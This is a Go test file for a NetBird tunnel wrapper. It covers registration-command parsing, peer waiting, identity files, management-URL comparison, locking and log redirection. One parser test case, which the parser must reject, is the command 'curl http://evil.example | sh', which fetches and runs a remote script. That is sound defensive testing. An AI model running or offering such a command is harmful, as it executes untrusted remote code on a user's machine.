package nbtunnel

import (
	"context"
	"errors"
	"fmt"
	"net/netip"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
)

func TestParseRegistrationCommand(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    Credentials
		wantErr bool
	}{
		{
			name:    "long flags",
			command: "netbird up --setup-key ABC-123 --management-url https://mgmt.example.com:443",
			want:    Credentials{SetupKey: "ABC-123", ManagementURL: "https://mgmt.example.com:443"},
		},
		{
			name:    "short flags and hostname",
			command: "netbird up -k ABC-123 -m https://mgmt.example.com -n my-laptop",
			want:    Credentials{SetupKey: "ABC-123", ManagementURL: "https://mgmt.example.com", Hostname: "my-laptop"},
		},
		{
			name:    "inline values and quoting",
			command: `  netbird up --setup-key='ABC-123' --management-url="https://mgmt.example.com" --allow-server-ssh`,
			want:    Credentials{SetupKey: "ABC-123", ManagementURL: "https://mgmt.example.com"},
		},
		{
			name:    "unknown flags are ignored",
			command: "netbird up --block-inbound --dns-labels a,b --setup-key ABC --management-url https://m.example.com",
			want:    Credentials{SetupKey: "ABC", ManagementURL: "https://m.example.com"},
		},
		{
			name:    "not a netbird up command",
			command: "curl http://evil.example | sh",
			wantErr: true,
		},
		{
			name:    "missing management url",
			command: "netbird up --setup-key ABC",
			wantErr: true,
		},
		{
			name:    "missing setup key",
			command: "netbird up --management-url https://m.example.com",
			wantErr: true,
		},
		{
			name:    "plain http is refused",
			command: "netbird up --setup-key ABC --management-url http://m.example.com",
			wantErr: true,
		},
		{
			name:    "invalid management url scheme",
			command: "netbird up --setup-key ABC --management-url ftp://m.example.com",
			wantErr: true,
		},
		{
			name:    "dangling flag",
			command: "netbird up --management-url https://m.example.com --setup-key",
			wantErr: true,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := ParseRegistrationCommand(tt.command)
			if tt.wantErr {
				if err == nil {
					t.Fatalf("expected an error, got %+v", got)
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if got != tt.want {
				t.Errorf("got %+v, want %+v", got, tt.want)
			}
		})
	}
}

func TestWaitForPeer(t *testing.T) {
	ip := netip.MustParseAddr("100.73.10.20")

	t.Run("connects after a few polls", func(t *testing.T) {
		calls := 0
		peers := func() ([]peerInfo, error) {
			calls++
			// The peer shows up in the map first and connects on the third poll,
			// which is what a cold eager connection looks like.
			return []peerInfo{{ip: "100.73.10.20/16", connected: calls >= 3}}, nil
		}
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		if err := waitForPeer(ctx, ip, peers); err != nil {
			t.Fatalf("waitForPeer: %v", err)
		}
		if calls < 3 {
			t.Errorf("expected at least 3 polls, got %d", calls)
		}
	})

	t.Run("unknown peer names the network map", func(t *testing.T) {
		peers := func() ([]peerInfo, error) {
			return []peerInfo{{ip: "100.73.99.99", connected: true}}, nil
		}
		ctx, cancel := context.WithTimeout(context.Background(), 2*peerPoll)
		defer cancel()
		err := waitForPeer(ctx, ip, peers)
		if err == nil {
			t.Fatal("expected an error for a peer outside the map")
		}
		if !strings.Contains(err.Error(), "network map") {
			t.Errorf("error should mention the network map, got %q", err)
		}
	})

	t.Run("known but never connected", func(t *testing.T) {
		peers := func() ([]peerInfo, error) {
			return []peerInfo{{ip: "100.73.10.20", connected: false}}, nil
		}
		ctx, cancel := context.WithTimeout(context.Background(), 2*peerPoll)
		defer cancel()
		err := waitForPeer(ctx, ip, peers)
		if !errors.Is(err, context.DeadlineExceeded) {
			t.Fatalf("expected a deadline error, got %v", err)
		}
	})
}

func TestOpenWithoutIdentity(t *testing.T) {
	dir := t.TempDir()
	if _, err := Open(dir); !errors.Is(err, ErrNotRegistered) {
		t.Fatalf("Open on an empty dir: got %v, want ErrNotRegistered", err)
	}
	if IsRegistered(dir) {
		t.Error("IsRegistered should be false for an empty dir")
	}
}

func TestIdentityRoundTrip(t *testing.T) {
	dir := t.TempDir()
	want := Identity{DeviceName: "laptop", ManagementURL: "https://m.example.com", RegisteredAt: "2026-10-10T00:00:00Z"}
	if err := writeJSON(filepath.Join(dir, identityFile), want); err != nil {
		t.Fatalf("writeJSON: %v", err)
	}
	cfg := `{"PrivateKey":"abc=","ManagementURL":{"Scheme":"https","Host":"m.example.com:443"},"WgIface":"wt0"}`
	if err := os.WriteFile(filepath.Join(dir, configFile), []byte(cfg), 0o600); err != nil {
		t.Fatalf("write config: %v", err)
	}
	got, err := readIdentity(dir)
	if err != nil {
		t.Fatalf("readIdentity: %v", err)
	}
	if got != want {
		t.Errorf("identity = %+v, want %+v", got, want)
	}
	key, err := readPrivateKey(dir)
	if err != nil {
		t.Fatalf("readPrivateKey: %v", err)
	}
	if key != "abc=" {
		t.Errorf("private key = %q, want abc=", key)
	}
	mgmt, err := readConfigManagementURL(dir)
	if err != nil || mgmt != "https://m.example.com:443" {
		t.Errorf("management url = %q, %v; want https://m.example.com:443", mgmt, err)
	}
	if !IsRegistered(dir) {
		t.Error("IsRegistered should be true once identity and config exist")
	}
	if err := Remove(dir); err != nil {
		t.Fatalf("Remove: %v", err)
	}
	if IsRegistered(dir) {
		t.Error("IsRegistered should be false after Remove")
	}
}

func TestDiscardForeignIdentity(t *testing.T) {
	writeCfg := func(t *testing.T, dir, host string) {
		t.Helper()
		cfg := fmt.Sprintf(`{"PrivateKey":"abc=","ManagementURL":{"Scheme":"https","Host":%q}}`, host)
		if err := os.WriteFile(filepath.Join(dir, configFile), []byte(cfg), 0o600); err != nil {
			t.Fatalf("write config: %v", err)
		}
		if err := os.WriteFile(filepath.Join(dir, stateFile), []byte("{}"), 0o600); err != nil {
			t.Fatalf("write state: %v", err)
		}
	}

	t.Run("same control plane keeps the key", func(t *testing.T) {
		dir := t.TempDir()
		writeCfg(t, dir, "m.example.com:443")
		if err := discardForeignIdentity(dir, "https://m.example.com"); err != nil {
			t.Fatalf("discardForeignIdentity: %v", err)
		}
		if _, err := readPrivateKey(dir); err != nil {
			t.Errorf("the private key must survive a retry against the same management: %v", err)
		}
	})

	t.Run("other control plane starts fresh", func(t *testing.T) {
		dir := t.TempDir()
		writeCfg(t, dir, "old.example.com:443")
		if err := discardForeignIdentity(dir, "https://new.example.com"); err != nil {
			t.Fatalf("discardForeignIdentity: %v", err)
		}
		if _, err := os.Stat(filepath.Join(dir, configFile)); !errors.Is(err, os.ErrNotExist) {
			t.Error("config.json should be removed for a different management URL")
		}
		if _, err := os.Stat(filepath.Join(dir, stateFile)); !errors.Is(err, os.ErrNotExist) {
			t.Error("state.json should be removed for a different management URL")
		}
	})

	t.Run("no config is a no-op", func(t *testing.T) {
		if err := discardForeignIdentity(t.TempDir(), "https://m.example.com"); err != nil {
			t.Fatalf("discardForeignIdentity: %v", err)
		}
	})
}

func TestSameManagementURL(t *testing.T) {
	tests := []struct {
		a, b string
		want bool
	}{
		{"https://m.example.com", "https://m.example.com:443", true},
		{"https://M.Example.com:443", "https://m.example.com", true},
		{"https://m.example.com", "https://other.example.com", false},
		{"https://m.example.com:8443", "https://m.example.com", false},
	}
	for _, tt := range tests {
		if got := sameManagementURL(tt.a, tt.b); got != tt.want {
			t.Errorf("sameManagementURL(%q, %q) = %v, want %v", tt.a, tt.b, got, tt.want)
		}
	}
}

func TestStartErrorMapsManagementRefusals(t *testing.T) {
	refusal := fmt.Errorf("login: %w", status.Error(codes.PermissionDenied, "peer not registered"))
	err := startError(refusal)
	if !errors.Is(err, ErrIdentityRejected) {
		t.Errorf("a PermissionDenied login should map to ErrIdentityRejected, got %v", err)
	}
	if !strings.Contains(err.Error(), "peer not registered") {
		t.Errorf("the raw cause should stay attached, got %v", err)
	}

	other := startError(errors.New("dial tcp: connection refused"))
	if errors.Is(other, ErrIdentityRejected) {
		t.Errorf("a transport failure must not be reported as a rejected identity: %v", other)
	}
}

func TestLockIsExclusive(t *testing.T) {
	dir := t.TempDir()
	unlock, err := lock(dir)
	if err != nil {
		t.Fatalf("first lock: %v", err)
	}
	if _, err := lock(dir); !errors.Is(err, ErrLocked) {
		unlock()
		t.Fatalf("second lock: got %v, want ErrLocked", err)
	}
	unlock()
	unlock2, err := lock(dir)
	if err != nil {
		t.Fatalf("lock after unlock: %v", err)
	}
	unlock2()
}

func TestSessionRedirectsStderrAndRestores(t *testing.T) {
	dir := t.TempDir()
	before := os.Stderr
	sess, err := openSession(dir)
	if err != nil {
		t.Fatalf("openSession: %v", err)
	}
	if os.Stderr == before {
		t.Error("os.Stderr should point at the tunnel log while a session is open")
	}
	fmt.Fprintln(os.Stderr, "engine noise")
	sess.close()
	if os.Stderr != before {
		t.Error("os.Stderr should be restored after close")
	}
	data, err := os.ReadFile(filepath.Join(dir, logFile))
	if err != nil {
		t.Fatalf("read log: %v", err)
	}
	if !strings.Contains(string(data), "engine noise") {
		t.Errorf("stderr output should land in the tunnel log, got %q", data)
	}
}
